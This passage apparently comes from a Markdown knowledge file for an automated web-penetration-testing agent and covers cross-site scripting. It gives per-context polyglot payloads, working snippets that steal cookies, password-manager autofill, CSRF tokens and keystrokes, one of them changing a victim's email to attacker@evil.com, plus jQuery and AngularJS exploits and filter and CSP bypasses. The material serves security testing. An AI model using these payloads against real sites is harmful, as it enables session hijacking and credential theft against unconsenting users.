templates, Handlebars helpers) can reach script via the constructor
gadget — re-keyed to a benign callback, not cookie theft:
```
{constructor.constructor('fetch("/HERMES-...")')()}
```
Server-side template injection is a different class — see
[ssti.md](ssti.md) and the SSTI witnesses in
[exploitation-techniques.md](../exploitation-techniques.md#ssti-server-side-template-injection).

### Polyglots (one per context)

Keep a compact set, picked by classified context — not brute force:
- **`HTML_BODY`**: `<svg/onload=fetch('/HERMES-...')>`
- **`HTML_ATTR_QUOTED`**: `" autofocus onfocus=fetch('/HERMES-...') x="`
- **`HTML_ATTR_UNQUOTED`**: `onmouseover=fetch('/HERMES-...')`
- **`JAVASCRIPT_STRING`**: `"-fetch('/HERMES-...')-"` (and `</script>`
  break-out when entity-encoded in a script string)
- **`JAVASCRIPT_TEMPLATE_LITERAL`**: `${fetch('/HERMES-...')}`
- **`URL_ATTR`**: `javascript:fetch('/HERMES-...')`
- **`EVENT_HANDLER`**: close the attr/handler, then chain a new handler.
- **`ERROR_PAGE`** (404 etc.): `https://target.com/<svg/onload=fetch('/HERMES-...')>`
  — ERB/Rails-style 404s may reflect the path unsafely.

### Exploitation payloads (minimum-impact proof)

Use these to demonstrate control — stop after one token read or one state change.

**Cookie theft** (only if no `HttpOnly` flag — check `Set-Cookie` header first):
```javascript
<script>
fetch('/HERMES-XSS-' + document.cookie)
</script>
```
Use `Image()` beacon if `fetch` is blocked by CSP:
```javascript
new Image().src = '/HERMES-XSS-' + document.cookie;
```

**Password capture** (password manager auto-fill):
```javascript
// Insert fake password field — password managers auto-fill it
var p = document.createElement('input');
p.type = 'password';
p.name = 'p';
document.body.appendChild(p);
// Read it after auto-fill
setTimeout(function() {
    fetch('/HERMES-PW-' + p.value);
}, 100);
```

**CSRF token theft** (proves tokens are useless against XSS):
```javascript
// Read CSRF token from page, perform state change
var csrf = document.querySelector('input[name=csrf]').value;
fetch('/email/change', {
    method: 'POST',
    body: 'csrf=' + csrf + '&email=attacker@evil.com'
});
```

**Keylogging** (demonstrates persistent impact):
```javascript
document.onkeypress = function(e) {
    fetch('/HERMES-KEY-' + e.key);
};
```

### Error-page XSS (commonly missed reflection point)

When a 404/500 error page reflects the requested path, it's often
served with a minimal template that does no encoding. Test this on
every URL parameter and path:
```
https://target.com/<svg/onload=fetch('/HERMES-...')>
https://target.com/search?q=<svg/onload=fetch('/HERMES-...')>
```
Common in ERB/Rails, PHP, and custom error handlers. The path reflection
can sometimes reach parameters in the URL as well.

### Special contexts

- **Email** — most clients strip scripts but allow CSS/remote content;
  use CSS/URL tricks only if relevant, don't assume JS executes.
- **PDF / docs** — engines may run JS in annotations or link/submit
  actions; test `javascript:` in links.
- **File uploads** — SVG/HTML served as `text/html` or `image/svg+xml`
  can execute inline. Check `Content-Type`, `Content-Disposition:
  attachment`, MIME sniffing, and `X-Content-Type-Options: nosniff`.

## Framework-specific sinks

- **React** — `dangerouslySetInnerHTML`; URLs/handlers built from
  untrusted input; custom renderers using `innerHTML`.
- **Vue** — `v-html`, dynamic attribute bindings; SSR-hydration
  mismatches re-interpreting content.
- **Angular** — legacy expression injection (pre-1.6); `$sce`
  trust APIs whitelisting attacker content.
- **Svelte** — `{@html}` and dynamic attributes.
- **Markdown/richtext** — raw-HTML passthrough; plugins re-enabling
  inline HTML; sanitize post-render or forbid inline HTML.

### jQuery DOM XSS (two classic patterns to test every time)

**Pattern 1 — `$()` selector sink with `location.hash`:**
```javascript
// Vulnerable autoscroll pattern
$(window).on('hashchange', function() {
    var element = $(location.hash);  // $() parses HTML when string starts with '<'
    element[0].scrollIntoView();
});
```
Exploit via iframe delivery (no user interaction needed):
```html
<iframe src="https://target.com/#" onload="this.src+='<img src=1 onerror=fetch(\'/HERMES-...\')>'">
```
Even newer jQuery versions are vulnerable when the source doesn't require a `#` prefix.

**Pattern 2 — `attr()` function with URL data:**
```javascript
// Vulnerable back-link pattern
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnUrl'));
```
Exploit: `?returnUrl=javascript:fetch('/HERMES-...')` — clicking the link fires the `javascript:` pseudo-protocol.

### AngularJS expression injection (`ng-app` present)

When the page uses `ng-app`, Angular evaluates `{{ }}` expressions directly
in HTML, even without `<script>` tags. This bypasses CSP that allows
`'unsafe-inline'` for Angular:
```
{{constructor.constructor('fetch("/HERMES-...")')()}}
{{$on.constructor('fetch("/HERMES-...")')()}}
```
Test both — `constructor.constructor` accesses `Function`, `$on.constructor`
accesses the Angular scope constructor.

## Bypasses

See [bypass-techniques.md](../bypass-techniques.md) for the cross-class
WAF/filter set. XSS-specific quick hits:

- **Filter/sanitizer** — case/whitespace/encoding variants, alternate tags
  and events (`<svg>`/`<math>`/`<details open ontoggle>`), HTML-entity and
  double-URL encoding, null bytes, broken-tag mXSS to survive a sanitizer.
- **CSP** — missing nonces/hashes, wildcard or `data:`/`blob:` sources,
  inline events allowed; JSONP/script-gadget endpoints; `<base>` injection
  to retarget relative scripts; lax import-maps/`modulepreload`; dynamic
  module import from an allowed origin. Treat CSP as a feature to violate —
  trigger the policy and record the violation report.
- **Trusted Types** — custom policies returning unsanitized strings;
  sinks not covered by TT (CSS, URL handlers) reached via gadgets.

### Bypass techniques that directly improve detection accuracy

**Backslash-escape neutralization** — when the app inserts `\` before quotes:
```
Input:              ';fetch('/HERMES-...')//
App transforms:     \';fetch('/HERMES-...')//    ← quote escaped, safe
Bypass input:       \';fetch('/HERMES-...')//
App transforms:     \\';fetch('/HERMES-...')//   ← first \ escapes second \ → quote terminates string → BREAKOUT SUCCEEDS
```
Always test this when you see backslash escaping. Mis-handled `\` is one of the most commonly missed XSS vectors.

**HTML-encoding bypass in event handlers** — when the app blocks `'` and `"` in an HTML attribute:
```html
<!-- Context: <a href="#" onclick="... var input='[USER_DATA]'; ..."> -->
<!-- Blocked: ' and " characters are filtered -->
<!-- Bypass using HTML entities, which the browser HTML-decodes BEFORE JS parsing: -->
Input:  &apos;-fetch(&apos;/HERMES-...&apos;)-&apos;
<!-- Browser decodes → '-fetch('/HERMES-...')-' → BREAKOUT SUCCEEDS -->
```
The HTML entity `&apos;` (or `&#39;`) works because the browser HTML-decodes attribute values before passing them to the JavaScript parser. This is **not** a double-encoding issue — it's the normal parsing order.

**No-parentheses execution** — when `(` and `)` are filtered:
```
onerror=alert;throw 1
```
Assigns `alert` to the global error handler, then `throw 1` passes `1` as argument. Works for any single-argument function. Critical for stored-XSS fields that strip parentheses.

**Template literal `${...}` injection** — when data lands in a backtick string:
```javascript
// Context: var msg = `[USER_DATA]`;
// No need to break out of backticks — just embed an expression:
${fetch('/HERMES-...')}
// Template literals evaluate ${} natively in the JavaScript parser.
```

**Encoded URI schemes** — bypass filters that check for `javascript:`:
```html
<IMG SRC=j&#X41vascript:alert('test')>   <!-- \x41 = 'a' — UTF-8 hex-encoded -->
<IMG SRC=javascript&#X3Aalert(1)>          <!-- colon encoded -->
```
Sanitizers often scan for `javascript:` as a contiguous string but miss characters like `\n`, `\t`, or HTML entities injected between characters.

**`<script>` closed + new tag** — when inside a `<script>` block, you can close it entirely:
```javascript
// Context: <script>var x = '[USER_DATA]';</script>
// Payload: </script><img src=1 onerror=fetch('/HERMES-...')>
```
The browser's HTML parser sees the `</script>` tag first (before JS parsing), closes the script block, and the `<img>` tag is parsed as HTML. This works even if the JavaScript string would be broken.

**Critical accuracy rule — `<script>` tags are blocked by `innerHTML`:**
If you are testing a DOM XSS sink that uses `innerHTML`, `insertAdjacentHTML`, or `outerHTML`, `<script>` elements will NOT execute on any modern browser. DO NOT conclude "not vulnerable" — switch to event-handler payloads:
```html
<!-- Won't work with innerHTML: -->
<img src=x onerror=fetch('/HERMES-...')>   <!-- USE THIS -->
<svg/onload=fetch('/HERMES-...')>          <!-- OR THIS -->
<details open ontoggle=fetch('/HERMES-...')> <!-- OR THIS -->
```

DOMPurify in strict mode with a URI allowlist generally holds — look for
mXSS and config gaps (`ALLOW_UNKNOWN_PROTOCOLS`, raw-HTML profiles)
before claiming a bypass.

## Validation (what promotes to L3/L4)

1. State the **render context** (sink type) and the minimal payload that
   fires there.
2. Provide before/after evidence — the DOM mutation or the network
   request the marker triggered, plus the server-log grep hit.
3. Show the bypass variant still fires if a sanitizer/CSP/Trusted Types
   is present (negative test: benign string blocked, payload executes).
4. Quantify impact beyond execution: one in-scope token read (redacted),
   one state-changing action performed as the victim role, or the marker
   firing in another user's session for stored.
5. Provide reproducible requests/URLs differing only in the injected
   fragment; note browser/parser specifics where relevant.

## False positives (don't report these)

- Reflected content safely encoded for the **exact** context it lands in.
- CSP with nonces/hashes and no `unsafe-inline`/`unsafe-eval` or inline
  event handlers (a working defense per
  [exploitation-techniques.md](../exploitation-techniques.md#defense-recognition-dont-waste-cycles)).
- Trusted Types enforced on the sink; DOMPurify strict mode with URI
  allowlist.
- Marker present in the DOM as inert text (`textContent`) but never
  executed — reflection ≠ execution.
- Self-XSS only reachable by pasting into your own console/devtools with
  no delivery path to another user.

## Impact & reporting

Session hijacking and credential theft, account takeover via token
exfiltration, CSRF chaining for state-changing actions, phishing
overlays, and persistent compromise (stored/service-worker). Report as
**A03 / CWE-79**; include the render context, the minimal firing payload,
and the marker evidence (network request + log grep). Provide CVSS only
for **L3/L4** findings.

## Pro tips

1. Classify context first; payload selection is mechanical after that.
2. One input can reflect in several contexts — enumerate every landing.
3. Instrument the DOM (log sink usage) to reveal unexpected source→sink
   flows before guessing payloads.
4. Keep a small curated payload per context; iterate encodings, not lists.
5. Treat SVG/MathML as first-class active content; test separately.
6. Re-run under each render path — SSR vs CSR vs hydration can differ.
7. Validate defenses as features: try to violate CSP/Trusted Types and
   capture the violation report.
8. Reflection is not execution — always confirm the marker actually fired.
9. **`innerHTML` / `insertAdjacentHTML` / `outerHTML` will NOT execute
   `<script>` tags** — always use event-handler payloads (`<img onerror>`,
   `<svg onload>`) for HTML content sinks. `document.write` IS safe for
   `<script>` but only fires during initial page load.
10. **Classify the source before the sink** in DOM XSS. The same sink
    is only exploitable if the source is attacker-controllable. E.g.,
    `innerHTML` reading from `location.hash` is different from reading
    a server-controlled variable.
11. **Always check for backslash mis-escaping** (`\\'` bypass described
    above) when you see single-quote escaping. This is the #1 most
    commonly missed vector in manual testing.
12. **Test `javascript:` in every `href`/`src`/`action`/`formaction`
    attribute** even when `<script>` tags are blocked. Allow-list
    sanitizers often strip `<script>` but keep `<a href>` or
    `<iframe src>`.
13. **Error pages are first-class XSS targets** — test path reflection on
    404/500 responses. Many apps have no protection on error templates.
14. **One input → multiple reflection contexts.** A single query parameter
    may appear in `HTML_BODY` (search result), `HTML_ATTR` (value attr),
    and `JAVASCRIPT_STRING` (analytics variable) in the same response.
    Each needs its own payload.
15. **Browser behavior varies.** Chrome URL-encodes `location.search` and
    `location.hash`, IE/Edge (pre-Chromium) did not. For DOM XSS via
    URL sources, test in both Chromium and Firefox.
16. **CSRF tokens do NOT protect against XSS** — XSS can read the token
    directly from the page DOM. If you have XSS, you have full bypass of
    CSRF protections.
"""